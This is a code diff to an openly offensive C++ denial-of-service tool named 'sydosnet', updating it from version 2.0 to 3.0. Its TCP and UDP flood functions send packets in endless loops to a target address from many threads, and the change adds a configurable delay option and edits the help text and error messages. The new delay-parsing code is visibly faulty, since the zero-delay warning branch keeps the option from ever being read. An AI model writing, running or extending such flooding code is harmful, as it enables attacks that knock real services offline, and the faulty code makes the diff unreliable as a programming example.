@@ -12,6 +12,7 @@ char target_ip[16]{0};
 int target_port = 0;
 int attack_thread = 0;
 char attack_method[4]{0};
+int attack_delay = 0;
 
 void tcpflood()
 {
@@ -30,6 +31,7 @@ void tcpflood()
 
     while(true) {
         send(sock, packet, sizeof(packet), 0);
+        usleep(attack_delay * 1000);
     }
 }
 
@@ -49,6 +51,7 @@ void udpflood()
 
     while(true) {
         sendto(sock, packet, sizeof(packet), 0, reinterpret_cast<sockaddr*>(&target), sizeof(sockaddr_in));
+        usleep(attack_delay * 1000);
     }
 }
 
@@ -57,14 +60,12 @@ void create_thread()
     if(strcmp(attack_method, "tcp") == 0) {
         for(int i = 0; i < attack_thread; i++) {
             std::thread(tcpflood).detach();
-            usleep(300 * 1000);
         }
     }
 
     else if(strcmp(attack_method, "udp") == 0) {
         for(int i = 0; i < attack_thread; i++) {
             std::thread(udpflood).detach();
-            usleep(300 * 1000);
         }
     }
 }
@@ -78,7 +79,7 @@ int main(int argc, char** argv)
         {
             std::cout << "                                                                " << std::endl;
             std::cout << " |                        | version |                         | " << std::endl;
-            std::cout << " |                   sydosnet v2.0 release                    | " << std::endl;
+            std::cout << " |                   sydosnet v3.0 release                    | " << std::endl;
             std::cout << " |                      made by SeungYup                      | " << std::endl;
             std::cout << " |                                                            | " << std::endl;
             std::cout << " |       Update: https://github.com/seungyup26/sydosnet       | " << std::endl;
@@ -103,6 +104,8 @@ int main(int argc, char** argv)
             std::cout << " |                  --thread  set attack thread               | " << std::endl;
             std::cout << " |                -m,                                         | " << std::endl;
             std::cout << " |                  --method  set attack method               | " << std::endl;
+            std::cout << " |                -d,                                         | " << std::endl;
+            std::cout << " |                  --delay  set attack delay                 | " << std::endl;
             std::cout << " |                                                            | " << std::endl;
             std::cout << " |       Update: https://github.com/seungyup26/sydosnet       | " << std::endl;
             std::cout << " |          API: https://github.com/seungyup26/dosapi         | " << std::endl;
@@ -131,6 +134,16 @@ int main(int argc, char** argv)
         {
             strcpy(attack_method, argv[i+1]);
         }
+
+        /* Set Attack Delay */
+
+    if(attack_delay == 0) {
+        std::cout << " W: attack delay is 0 " << std::endl;
+    }
+        else if(strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--delay") == 0)
+        {
+            attack_delay = atoi(argv[i+1]);
+        }
     }
 
     /* IP is null */
@@ -141,13 +154,13 @@ int main(int argc, char** argv)
 
     /* Port is null */
     if(target_port == 0) {
-        std::cout << " E: target port is null " << std::endl;
+        std::cout << " E: target port is 0 " << std::endl;
         return 1;
     }
 
     /* Thread is null */
     if(attack_thread == 0) {
-        std::cout << " E: attack thread is null " << std::endl;
+        std::cout << " E: attack thread is 0 " << std::endl;
         return 1;
     }
 
